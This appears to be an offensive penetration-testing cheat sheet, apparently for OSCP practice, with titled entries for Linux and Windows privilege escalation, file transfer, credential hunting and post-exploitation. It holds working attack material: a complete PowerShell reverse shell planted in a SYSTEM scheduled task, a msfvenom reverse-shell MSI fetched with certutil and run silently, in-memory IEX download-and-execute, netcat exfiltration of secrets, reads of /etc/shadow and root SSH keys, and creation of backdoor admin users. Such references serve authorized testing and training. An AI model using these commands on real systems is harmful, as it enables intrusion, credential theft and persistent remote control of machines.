# Basic local port forward.
portfwd 127.0.0.1:8080<-127.0.0.1:80

# Stop all sessions and the listener.
exit

commands.title: Proof Collection
commands.description: Find OSCP proof files and capture required context after getting access.
commands.command:
# Find local/proof files.
find / \( -name local.txt -o -name proof.txt \) 2>/dev/null

# User proof context.
whoami
hostname
cat /home/<USER>/local.txt
ifconfig

# Root proof context.
whoami
hostname
cat /root/proof.txt
ifconfig

commands.title: Proof Collection
commands.description: Find OSCP proof files and capture required context after getting access.
commands.command:
:: Find local/proof files.
for /d %u in (C:\Users\*) do @dir "%u\Desktop\local.txt" "%u\Desktop\proof.txt" /b 2>nul

:: User proof context.
whoami
hostname
type C:\Users\<USER>\Desktop\local.txt
ipconfig

:: Admin proof context.
whoami
hostname
type C:\Users\Administrator\Desktop\proof.txt
ipconfig

:: Directory tree helpers.
tree
tree /f /a
tree C:\Users /f /a
tree C:\Users /f /a | findstr /i "proof.txt local.txt"

commands.title: Proof Collection
commands.command:
Get-ChildItem C:\ -Recurse -Include local.txt,proof.txt -ErrorAction SilentlyContinue
whoami; hostname; type C:\Users\<USER>\Desktop\local.txt; ipconfig
whoami; hostname; type C:\Users\Administrator\Desktop\proof.txt; ipconfig

commands.title: Restricted Shell Escape
commands.description: Escape a restricted shell such as `rbash`, then restore a usable `PATH`.
commands.command:
# 1. Check helper binaries available to the restricted user.

ls /home/<USER>/bin

# 2. If `ed` is available, escape through shell execution.

ed
!/bin/bash

# 3. If `more`, `less`, or `man` is available, open a readable file and spawn bash from inside the pager.

less /etc/hosts
!/bin/bash

# 4. After escaping, restore common binary paths.

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

commands.title: Send Attacker File To Target
commands.description: Push a file from the attacker to the target over Netcat.
commands.command:
# 1. Prepare the file on the attacker box.

echo "Payload" > shell.txt

# 2. Start the receiver on the target.

nc -lvnp <LPORT> > exploit.txt

# 3. Send the file from the attacker box.

nc <TARGET_IP> <LPORT> < shell.txt

commands.title: Send Target File To Attacker
commands.description: Pull a file from the target back to the attacker over Netcat.
commands.command:
# 1. Prepare a sample file on the target if needed.

echo "password" > secret.txt

# 2. Start the receiver on the attacker box.

nc -lvnp <LPORT> > dump.txt

# 3. Send the file from the target.

nc <LHOST> <LPORT> < secret.txt

commands.title: Sessions
commands.description: Check who is logged on and which interactive/network sessions are active.
commands.command:
:: Logged-on users.
query user

:: RDP / console sessions.
qwinsta

:: Active network sessions.
net session

commands.title: SMB
commands.description: Host an SMB share and copy files to or from it.
commands.command:
# 1. Attacker: start an SMB share.

impacket-smbserver share . -smb2support -username <USER> -password <PASS>

# 2. Target: copy from the attacker share.

net use \\<LHOST>\share /user:<USER> <PASS>
copy \\<LHOST>\<SHARE>\<FILE> .

# 3. Target: copy a file back, then disconnect.

copy <FILE> \\<LHOST>\share\
net use /d \\<LHOST>\share

commands.title: Tree View
commands.description: Print a compact directory tree when `tree` is unavailable.
commands.command: find . -maxdepth 3 | awk -F/ '{for(i=1;i<NF;i++) printf " "; print $NF}'

commands.title: Upgrade a basic Linux shell into a fully interactive TTY.
commands.command:
# Spawn a proper bash PTY.
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell.
Ctrl+Z

# On the attacker box, note local rows / columns.
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

# Bring the shell back in raw mode.
stty raw -echo; fg

# On the target, fix terminal size and TERM.
stty rows <ROWS> cols <COLS>
export TERM=xterm-256color
exec /bin/bash

commands.title: Users And Groups
commands.description: Enumerate domain groups, domain users, and interesting local groups.
commands.command:
:: Domain users.
net user /domain
net user <USER> /domain

:: Domain groups.
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "<GROUP>" /domain

:: Local groups.
net localgroup administrators
net localgroup "<GROUP>"

commands.title: Windows Enable RDP
commands.description: Enable RDP with NetExec when you have local admin credentials.
commands.command: nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable

commands.title: Windows Execution Policy Bypass
commands.description: Set PowerShell execution policy to bypass on the machine.
commands.command: Set-ExecutionPolicy Bypass -Scope LocalMachine

commands.title: Windows HTTP
commands.description: Quick Windows HTTP download reference.
commands.command:
# PowerShell Invoke-WebRequest
powershell -Command "Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -OutFile C:\Windows\Temp\<FILE>"

# PowerShell alias
iwr -Uri http://<LHOST>/<FILE> -OutFile <FILE>
iwr -Uri "http://$LOCAL_IP/file.exe" -O file.exe

# certutil
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
certutil -urlcache -split -f http://$LOCAL_IP/file.exe file.exe
certutil -urlcache -f http://<LHOST>/<FILE> <FILE>

# BITSAdmin
bitsadmin /transfer job http://<LHOST>/<FILE> C:\Users\Public\<FILE>

# PowerShell in-memory script load
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1') | IEX

commands.title: Windows Local Admin User
commands.description: Create a local admin user and grant remote access groups.
commands.command:
net user <USER> <PASS> /add
net localgroup Administrators <USER> /add
net localgroup "Remote Management Users" <USER> /add
net localgroup "Remote Desktop Users" <USER> /add

commands.title: 7-Zip Wildcard File Read
commands.description: Abuse `7z` wildcard/listfile behavior when root runs `7za ... -- *` inside a directory you control.
commands.command:
# Target: move to the directory controlled by your low-privileged user.
cd <WRITABLE_DIR>

# Read /etc/shadow through a 7-Zip listfile symlink.
touch @root.txt
ln -s /etc/shadow root.txt

# Alternative: read root SSH key if the backup job runs as root.
touch @root.txt
ln -s /root/.ssh/id_rsa root.txt

# Wait for a root job like:
# 7za a /backup/$(date +%F).7z -t7z -snl -- *
# 7-Zip attempts to read root.txt as a listfile and may print contents to stderr/logs.

commands.title: AccessChk Permission Review
commands.description: Use Sysinternals `accesschk.exe` to confirm writable services, binaries, directories, and registry keys.
commands.command:
:: Check service permissions.
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -accepteula -uwcqv "Everyone" *

:: Check binary and directory permissions.
accesschk.exe -accepteula -quvw C:\Path\To\Service.exe
accesschk.exe -accepteula -uwdq "C:\Program Files\"

:: Check writable service registry keys.
accesschk.exe -accepteula -uvwk HKLM\System\CurrentControlSet\Services

commands.title: Add Local Admin DLL
commands.description: Step-by-step `TextShaping.dll` hijack to add a local admin user.

commands.title: Add Local Admin User
commands.description: Create a user and add it to local administrators.
commands.command:
net user <USER> <PASS> /add
net localgroup administrators <USER> /add

commands.title: adm Group Log Looting
commands.description: If your user is in the `adm` group, read administrative logs for passwords, credentials, web requests, and command traces.
commands.command:
# Confirm adm group membership.
id

# Common logs readable by adm users.
ls -la /var/log
ls -la /var/log/syslog /var/log/auth.log /var/log/kern.log 2>/dev/null
ls -la /var/log/apache2 2>/dev/null

# Search for high-signal secrets.
grep -RiaE "pass|password|passwd|pwd|user|token|key|secret|credential" /var/log 2>/dev/null

commands.title: AlwaysInstallElevated
commands.description: Exploit AlwaysInstallElevated when both HKCU and HKLM installer policy keys are enabled.
commands.command:
# 1. Check the required registry keys.

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# 2. Create a malicious MSI on Kali.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi

# 3. Download and execute the MSI silently on the target.

certutil.exe -urlcache -f http://<LHOST>/installer.msi C:\Users\Public\installer.msi
msiexec /quiet /qn /i C:\Users\Public\installer.msi

commands.title: Audit Scripts
commands.description: Run common Windows privesc PowerShell audit scripts from disk or in memory.
commands.command:
# PowerUp
certutil.exe -urlcache -f http://<LHOST>/PowerUp.ps1 PowerUp.ps1
powershell -ExecutionPolicy Bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1') | IEX
Invoke-PrivescAudit

# Seatbelt
Seatbelt.exe -group=all

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck --Extended

commands.title: Capability Discovery
commands.description: Find dangerous Linux capabilities and abuse high-impact ones such as `cap_setuid` or `cap_dac_read_search`.
commands.command:
# Discover file capabilities.
getcap -r / 2>/dev/null

# Inspect process capabilities if a PID is interesting.
cat /proc/<PID>/status | grep Cap

# High-value examples:
# cap_setuid            -> can switch UID, often direct root shell on interpreters.
# cap_dac_override      -> can bypass file permissions.
# cap_dac_read_search   -> can read files regardless of DAC permissions.
# cap_sys_admin         -> broad privileged capability, investigate carefully.
# cap_net_raw           -> raw socket access; usually not direct privesc.
# cap_net_bind_service  -> can bind low ports, usually not direct privesc by itself.

# Python with cap_setuid.
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

# Perl with cap_setuid.
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
id && whoami

# Tar with cap_dac_read_search: read root-only files.
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

commands.title: Capability File Looting
commands.description: Use `cap_dac_read_search` on archive tools to steal root-only credentials or keys.
commands.command:
# Victim: archive and extract /etc/shadow.
getcap -r / 2>/dev/null
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

# Attacker: crack copied hashes offline.
john shadow --wordlist=/usr/share/wordlists/rockyou.txt

# Victim: if root SSH key is readable through tar capability.
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
cat root/.ssh/id_rsa

# Attacker: use the copied key.
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET_IP>
id && whoami

commands.title: Credential Hunting
commands.description: Search for credentials in config files, shell history, packet captures, and SSH key material.
commands.command:
# Common web/app config files.
find / -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null
find / -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 2>/dev/null
locate pass | more
grep -r 'password' /var/www/ 2>/dev/null
grep -r 'passwd' /etc/ 2>/dev/null
find / -name '*.conf' -exec grep -i 'password' {} \; 2>/dev/null

# Bash history.
history
cat /home/<USER>/.bash_history
cat ~/.bash_history | grep -i passw
cat ~/.zsh_history
cat ~/.mysql_history

# Credentials inside tcpdump/pcap captures.
tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='

# SSH keys.
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
find / -name '*.pem' 2>/dev/null

# Database/web config files.
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env

commands.title: Credential Hunting
commands.description: Search common Windows locations for saved credentials, unattended install files, vault entries, private keys, and PowerShell history.

dir C:\ /s /b | findstr /i pass

:: Unattended install files.

type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep.inf

:: Windows credential stores.
cmdkey /list

powershell -c "Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Filter *.kdbx"

:: PowerShell history.
dir C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

commands.title: Quick Checks
commands.description: Run a first-pass Linux privesc checklist for system context, sudo, SUID/SGID, capabilities, writable paths, cron, processes, and kernel version.
commands.command:
# Current user, groups, hostname, and kernel.
id
whoami
hostname
uname -a
uname -r
cat /etc/os-release
lsb_release -a
lscpu

# Local users with interactive shells.
cat /etc/passwd
getent passwd | grep -v nologin | grep -v false

# Home and common web roots.
ls -la /home
ls -la /var/www
ls -la /var/www/html

# Network and interesting root-owned processes.
ss -tulpn
netstat -tulpn
ps aux | grep root
ps aux | grep root | grep -i mysql

# Sudo rights.
sudo -l
sudo --version

# SUID binaries.
find / -perm -4000 -type f 2>/dev/null
# SUID binaries with permission, owner, and group details.
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} +
# SGID binaries
find / -perm -2000 -type f 2>/dev/null
# SGID binaries with permission, owner, and group details.
find / -perm -g=s -type f 2>/dev/null -exec ls -l {} +
find / -perm -g=s -type f 2>/dev/null -exec ls -l {} + | grep -v "root root"
# SUID and SGID binaries.
find / -perm /6000 -type f 2>/dev/null -exec ls -l {} +

# Linux capabilities and writable locations.
getcap -r / 2>/dev/null
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_sys_admin"
find / -writable -type d 2>/dev/null
find / -perm -o+w -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"
find / -perm -o+w -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"
# Writable SUID/SGID files are high-signal privesc candidates.
find / -perm /6000 -type f -writable 2>/dev/null -exec ls -l {} +

# Cron and kernel quick checks.
cat /etc/crontab
ls -la /etc/cron*
searchsploit linux kernel <VERSION>

Get-Service

wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"
icacls "C:\Path\To\Service.exe"

# Installed software and common writable install paths.

dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\ProgramData

commands.title: Scheduled Task Script Hijack
commands.description: Hijack a scheduled task script when it runs as SYSTEM and the script path is writable.
commands.command:
# 1. Find non-Microsoft scheduled tasks.

Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }

# 2. Inspect the interesting task and script permission.

schtasks /query /tn "VulnerableTask" /v /fo list
icacls C:\Users\Public\TaskScript\taskscript.ps1

# 3. Replace `taskscript.ps1` with this PowerShell reverse shell body.

# --- file powershell ---

$LHOST = "<LHOST>"
$LPORT = <LPORT>
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
  while ($NetworkStream.DataAvailable) {
    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
    $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
  }
  if ($TCPClient.Connected -and $Code.Length -gt 1) {
    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
    $StreamWriter.Write("$Output`n")
    $Code = $null
  }
}
$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()

# --- end file powershell ---

# 4. Catch the scheduled callback.

nc -lvnp <LPORT>
